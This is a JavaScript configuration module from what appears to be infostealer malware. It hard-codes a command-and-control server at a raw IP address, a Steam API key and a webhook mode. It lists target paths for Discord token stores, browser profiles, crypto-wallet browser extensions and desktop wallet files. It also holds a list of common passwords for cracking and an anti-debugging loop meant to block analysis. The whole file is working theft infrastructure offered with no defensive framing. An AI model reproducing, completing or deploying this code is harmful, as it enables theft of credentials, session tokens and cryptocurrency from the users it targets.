'use strict';

var a8M = this && this.__importDefault || function (b) {
  if (b && b.__esModule) return b;
  return { default: b };
};

Object.defineProperty(exports, "__esModule", { value: true });

const path = a8M(require("path"));
const os = a8M(require("os"));

const homeDir = os.default.homedir();
const appData = process.env.APPDATA || "";
const localAppData = process.env.LOCALAPPDATA || "";

function isSystemProfile(p) {
  if (!p) return false;
  return /system32\\config\\systemprofile/i.test(p) || /\\bSYSTEMPROFILE\\b/i.test(p) || /systemprofile/i.test(p);
}

exports.appData = !appData || isSystemProfile(appData) ? path.default.join(homeDir, "AppData", "Roaming") : appData;
exports.localappdata = !localAppData || isSystemProfile(localAppData) ? path.default.join(homeDir, "AppData", "Local") : localAppData;

exports.tempDir = os.default.tmpdir();
exports.LOCAL = exports.localappdata;
exports.ROAMING = exports.appData;
exports.BASE_API_URL = "http://213.142.135.203:3000";
exports.BUILD_ID = "7737044148";
exports.THEME = "Normal2game.html";
exports.STEAM_API_KEY = "440D7F4D810EF9298D25EDDF37C1F902";
exports.nggrkey = "WEBHOOK_MODE";
exports.wordlistFilePath = path.default.join(exports.tempDir, "X7G8JQW9LFH3YD2KP6ZTQ4VMX5N8WB1RHFJQ.txt");

exports.defaultPasswords = ["1234", "12345", "123456", "12345678", "123456789", "password", "admin", "root", "qwerty", "abc123", "letmein", "welcome", "1234567", "passw0rd", "1234567890", "1q2w3e4r", "sunshine", "iloveyou", "football", "monkey", "superman", "hunter2", "dragon", "baseball", "shadow", "trustno1", "password1", "master", "login", "qazwsx", "starwars", "654321", "access", "123qwe", "zaq12wsx", "1qaz2wsx", "hello123", "batman", "charlie", "letmein123", "mustang", "696969", "michael", "freedom", "secret", "abc12345", "loveyou", "whatever", "trustme", "666666"];

exports.browserPathsX = {
  chrome: ["AppData\\Local\\Google\\Chrome\\User Data\\"],
  opera: ["AppData\\Roaming\\Opera Software\\Opera Stable\\", "AppData\\Roaming\\Opera Software\\Opera GX Stable\\"],
  brave: ["AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\"],
  yandex: ["AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Profile 1\\"],
  edge: ["AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\"]
};

exports.PATHS = {
  Discord: path.default.join(exports.ROAMING, "discord"),
  "Discord Canary": path.default.join(exports.ROAMING, "discordcanary"),
  Brave: path.default.join(exports.LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
  Chrome: path.default.join(exports.LOCAL, "Google", "Chrome", "User Data"),
  Edge: path.default.join(exports.LOCAL, "Microsoft", "Edge", "User Data"),
  Opera: path.default.join(exports.ROAMING, "Opera Software", "Opera Stable"),
  "Opera GX": path.default.join(exports.ROAMING, "Opera Software", "Opera GX Stable")
};

exports.browserWalletPaths = {
  Chrome: {
    base: path.default.join(exports.localappdata, "Google", "Chrome", "User Data"),
    wallets: {
      MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
      Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
      "Trust Wallet": "egjidjbpglichdcondbcbdnbeeppgdph",
      "Binance Wallet": "fhbohimaelbohpjbbldcngcnapndodjp",
      "Coinbase Wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad"
    }
  }
};

exports.desktopWalletPaths = {
  Exodus: path.default.join(exports.appData, "Exodus", "exodus.wallet"),
  Atomic: path.default.join(exports.appData, "atomic", "Local Storage", "leveldb"),
  Electrum: path.default.join(exports.appData, "Electrum", "wallets"),
  Coinomi: path.default.join(exports.localappdata, "Coinomi", "Coinomi", "wallets"),
  Guarda: path.default.join(exports.appData, "Guarda"),
  Bitcoin: path.default.join(exports.appData, "Bitcoin")
};

function antiDebug(state) {
  function checker(counter) {
    if (typeof counter === "string") {
      return function (h) {}.constructor("while (true) {}").apply("counter");
    } else if (("" + counter / counter).length !== 1 || counter % 20 === 0) {
      (function () { return true; }).constructor("debugger").call("action");
    } else {
      (function () { return false; }).constructor("debugger").apply("stateObject");
    }
    checker(++counter);
  }
  try {
    if (state) return checker;
    else checker(0);
  } catch (h) {}
}

(function () {
  let globalObj;
  try {
    globalObj = Function('return (function() {}.constructor("return this")( ));')();
  } catch (e) {
    globalObj = window;
  }
  globalObj.setInterval(antiDebug, 4000);
})();
